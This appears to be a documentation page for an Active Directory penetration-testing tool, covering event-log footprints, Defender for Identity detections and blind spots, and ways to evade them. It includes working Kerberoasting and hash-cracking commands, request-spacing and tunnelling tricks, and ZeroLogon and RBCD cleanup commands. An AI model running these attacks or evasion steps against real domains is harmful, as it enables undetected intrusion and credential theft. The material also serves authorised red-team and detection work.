# Detection & Evasion

> Understanding what noise kerb-map generates — and how to minimise it — is essential for professional engagements. This page covers the Windows event log footprint of every module, MDI detection rules, and practical evasion techniques.

---

## Noise Profile by Module

| Module | Noise Level | Windows Event IDs | MDI | Notes |
|---|---|---|---|---|
| LDAP queries (delegation, users, noPac, AD CS) | 🟢 LOW | 1644 (only if LDAP diagnostic logging enabled) | No | Indistinguishable from normal domain traffic |
| SPN scan (no ticket request) | 🟢 LOW | None | No | Pure LDAP read |
| AS-REP scan | 🟢 LOW | None | No | Pure LDAP read |
| AD CS template audit | 🟢 LOW | None | No | Configuration partition LDAP |
| MS14-068 check | 🟢 LOW | None | No | Domain functional level check only |
| Kerberoasting — AES tickets | 🟡 MEDIUM | 4769 per ticket request | Possible | Blend in with legitimate service auth |
| Kerberoasting — RC4 tickets | 🔴 HIGH | 4769 (EncryptionType 0x17) | Yes | MDI flags RC4 requests from AES-capable domains |
| ZeroLogon probe | 🟡 MEDIUM-HIGH | 5827, 5828 on patched DCs | Yes | Netlogon events generated on rejection |
| PrintNightmare probe | 🔴 HIGH | 5145 (named pipe access) | Yes | Every bind attempt is logged |
| PetitPotam probe | 🔴 HIGH | 5145 | Yes | Every bind attempt is logged |

## Windows Event IDs Reference

### Event 4769 — Kerberos Service Ticket Request

Generated on the DC for every TGS request. The critical field is `TicketEncryptionType`:

```
EncryptionType 0x12 = AES256-CTS-HMAC-SHA1-96  (normal)
EncryptionType 0x11 = AES128-CTS-HMAC-SHA1-96  (normal)
EncryptionType 0x17 = RC4-HMAC                  (RED FLAG)
EncryptionType 0x18 = RC4-HMAC-EXP              (RED FLAG)
```

**Why RC4 is a red flag:** Modern Windows clients and services use AES by default. An RC4 ticket request from a client that supports AES is abnormal and specifically flagged by MDI as a potential Kerberoasting attempt.

**MDI Rule:** "Suspected Kerberos golden ticket usage (encryption downgrade)" and "Suspected Kerberoasting attack"

### Event 5145 — Network Share Object Access

Generated for every named pipe access attempt. Relevant pipes kerb-map accesses in aggressive mode:
- `\pipe\spoolss` — PrintNightmare probe
- `\pipe\lsarpc` — PetitPotam probe

### Event 5827 / 5828 — Netlogon Denied Connection

Generated when a patched DC rejects a Netlogon connection that uses the vulnerable secure channel. These events are generated by kerb-map's ZeroLogon probe on patched systems.

### Event 1644 — LDAP Query Diagnostic

Only generated if `DiagnosticLogging` is set to `5` in the registry on the DC (rarely enabled in production). If enabled, all LDAP queries including kerb-map's enumeration will be logged.

## MDI (Microsoft Defender for Identity) Detections

MDI is a cloud-based identity security product that analyses DC event logs and network traffic (via a sensor on the DC). Understanding its detection rules helps you operate within acceptable noise levels.

### MDI Rules Triggered by kerb-map

| Operation | MDI Alert | Threshold |
|---|---|---|
| RC4 Kerberoasting | "Suspected Kerberoasting attack" | Multiple RC4 TGS requests from one source |
| AS-REP bulk requests | "Account enumeration" | Volume-based |
| ZeroLogon probe | "Suspected Netlogon privilege escalation attempt" | Any abnormal Netlogon pattern |
| PrintNightmare pipe | "Suspected exploitation of Print Spooler" | Pipe bind from unusual source |
| Lateral movement | "Suspected identity theft using Pass-the-Hash" | NTLM auth from unusual source |

### MDI Blind Spots

MDI has limited or no visibility into:
- Pure LDAP enumeration queries (reads only)
- Certificate-based authentication (AD CS attacks can be stealthy)
- Off-hours activity that blends with legitimate scheduled tasks
- Activity originating from trusted internal IPs

## Evasion Techniques

### 1. Stealth Mode — LDAP Jitter

```bash
kerb-map -d corp.local -dc 192.168.1.10 -u jsmith -p Password123 --stealth
```

Adds random 0.8–3.0 second delays between each LDAP query. This spreads enumeration over a longer window and breaks pattern-based volume detection. Total scan time increases from ~10 seconds to several minutes.

### 2. Use AES for Kerberoasting

```bash
# Request AES tickets instead of RC4
GetUserSPNs.py corp.local/jsmith:Password123 \
    -request-user svc_sql \
    -enc-type aes256 \
    -outputfile svc_sql_aes.hash

hashcat -m 19700 svc_sql_aes.hash /usr/share/wordlists/rockyou.txt
```

AES hashes crack ~10x slower than RC4, but the trade-off is significant stealth improvement. MDI specifically flags RC4 requests on AES-capable domains. AES requests are indistinguishable from normal service authentication.

### 3. Gate Aggressive Checks

Never run `--aggressive` unless your engagement scope explicitly permits noisy testing:

```bash
# Default — safe LDAP only
kerb-map -d corp.local -dc 192.168.1.10 -u jsmith -p Password123 --all --cves

# Only enable RPC probes when specifically scoped
kerb-map -d corp.local -dc 192.168.1.10 -u jsmith -p Password123 --cves --aggressive
```

### 4. Operate During Business Hours

LDAP enumeration traffic during business hours blends with:
- Group Policy refresh cycles (every 90 minutes + random offset)
- Exchange/Teams/SharePoint AD lookups
- Help desk tooling (ADUC, PowerShell Active Directory module)
- Vulnerability scanner traffic

The same queries at 3am stand out significantly more in baseline analysis.

### 5. Avoid Multiple Kerberoast Requests in Quick Succession

Space out TGS requests manually if targeting multiple accounts:

```bash
# Don't do this (automated burst):
GetUserSPNs.py corp.local/jsmith:pass -request -outputfile all.hash

# Do this instead (manual, spaced):
GetUserSPNs.py corp.local/jsmith:pass -request-user svc_sql -outputfile svc_sql.hash
sleep 300  # 5 minute gap
GetUserSPNs.py corp.local/jsmith:pass -request-user svc_backup -outputfile svc_backup.hash
```

### 6. Use Credentials From the Target Subnet

LDAP queries from a domain-joined machine on the internal network look significantly more legitimate than the same queries originating from a Kali box on a different subnet.

If you have code execution on any internal host:

```bash
# Tunnel kerb-map through the internal host using SSH port forwarding
ssh -L 1389:192.168.1.10:389 user@internal_host

# Then query against localhost (tunnel forwards to DC)
kerb-map -d corp.local -dc 127.0.0.1 -p 1389 -u jsmith -p Password123
```

### 7. Use `--no-cache` for Sensitive Operations

```bash
# Don't save scan results to local SQLite database
kerb-map -d corp.local -dc 192.168.1.10 -u jsmith -p Password123 --no-cache
```

This prevents scan history from being stored on the assessment machine, reducing forensic artefacts if the machine is later imaged.

## Comparing Noise Levels: kerb-map vs Other Tools

| Tool / Operation | Noise | Rationale |
|---|---|---|
| kerb-map `--all` (no `--aggressive`) | 🟢 LOW | Pure LDAP reads |
| kerb-map `--all --aggressive` | 🟡 MEDIUM | Adds RPC probes |
| SharpHound collection | 🟡 MEDIUM | LDAP + SMB session enumeration |
| BloodHound-python (all collection) | 🟡 MEDIUM | LDAP + RPC |
| nxc `--users --groups` | 🟢 LOW | LDAP/SMB enumeration |
| nxc `--ntds` | 🔴 HIGH | Volume shadow copy creation on DC |
| mimikatz `sekurlsa::logonpasswords` | 🔴 HIGH | LSASS memory access |
| secretsdump (remote) | 🟡 MEDIUM | DRSUAPI or svcctl/drsr |
| Responder | 🔴 HIGH | Network poisoning — obvious in packet captures |
| Kerberoasting with RC4 | 🔴 HIGH | MDI alert |
| Kerberoasting with AES | 🟡 MEDIUM | Blends with normal auth |

## Post-Engagement Cleanup

Always clean up after an assessment:

```bash
# Remove any machine accounts created for RBCD
delcomputer.py -computer-name 'ATTACKER$' corp.local/jsmith:Password123

# Restore DC machine account if ZeroLogon was exploited
python restorepassword.py corp.local/DC01@192.168.1.10 \
    -target-ip 192.168.1.10 \
    -hexpass <original_password>

# Remove RBCD attribute if written
rbcd.py -delegate-to TARGETPC$ -delegate-from ATTACKER$ \
    -action remove corp.local/jsmith:Password123

# Remove any added ACEs (DCSync rights, group memberships, etc.)
# Document all changes made during the engagement for the report
```
